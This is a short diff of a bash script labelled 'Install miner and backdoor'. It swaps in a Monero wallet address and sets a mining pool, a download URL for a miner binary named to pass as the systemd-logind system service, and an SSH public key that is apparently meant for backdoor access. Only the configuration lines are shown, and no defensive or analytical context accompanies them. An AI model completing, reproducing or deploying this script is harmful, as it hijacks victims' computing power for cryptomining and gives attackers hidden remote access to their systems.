@@ -1,5 +1,8 @@
 #!/bin/bash# setup.sh – Install miner and backdoor
-WALLET = "43QinLvHtCRAGydwXBhictMDDtfqac3jAjX21cQtx1bxTrVCTAAd19mhX2cFeXtB89gR4eFHCspuyXbgqEQNYkaREBZZHXX"POOL="pool.supportxmr.com:3333"MINER_URL="https://github.com/RALPH-005/payload/raw/refs/heads/main/systemd-logind"SSH_PUBKEY="b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcnNhAAAAAwEAAQAAAgEAujcdX079dDn48xDbX9lWRNVCBweOHNe7dtOIkCF6/pLwSjbOLrAM
+WALLET = "89T9kvjYMeqBY8yky4mbP8EDP1rouQDjJgGkRZ22uFXz9phDhtMSYKz8Skq8B7d8LfVitghrx4juyTXrUeDwsUHwCut2EYM"
+POOL="pool.supportxmr.com:3333"
+MINER_URL="https://github.com/RALPH-005/payload/raw/refs/heads/main/systemd-logind"
+SSH_PUBKEY="b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcnNhAAAAAwEAAQAAAgEAujcdX079dDn48xDbX9lWRNVCBweOHNe7dtOIkCF6/pLwSjbOLrAM
 440Ck+kvDTjJUWPHmhRdu/UWJ5G3t6jNyx44ILxQgmDhtF3pamLyM1laSLBv1EkdO4Ux/3
 vdnxmMul7lFKd8jDfLvBovParc0q3hzQ693GhVvv6W6CJR7W+yjY/DrkxjS95J6SC42deC
 QFvitB3q51AjS6xzbzoVF97YLuN/bZ8B5aHLYcrfm0Wg5H29FSP4IVXyA9RFdtwdMfATTq
